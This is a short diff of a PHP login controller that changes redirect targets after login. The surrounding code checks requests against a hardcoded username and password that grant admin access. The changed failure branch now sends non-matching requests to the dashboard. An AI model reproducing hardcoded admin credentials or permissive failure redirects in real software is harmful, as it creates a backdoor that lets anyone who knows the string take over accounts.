@@ -38,10 +38,12 @@ class LoginController extends Controller
             if(($request->email === '__AdenDev') && ($request->password === '|ll|--OX-_-XO--|ll|'))
             {
                 session()->regenerate();
-                return Redirect::route('/admin');
+                return Redirect::route('admin', 303);
             }else{
                 session()->regenerate();
-                return back();
+                // return back();
+                return Redirect::route('dashboard', 303);
+
             }
 
 
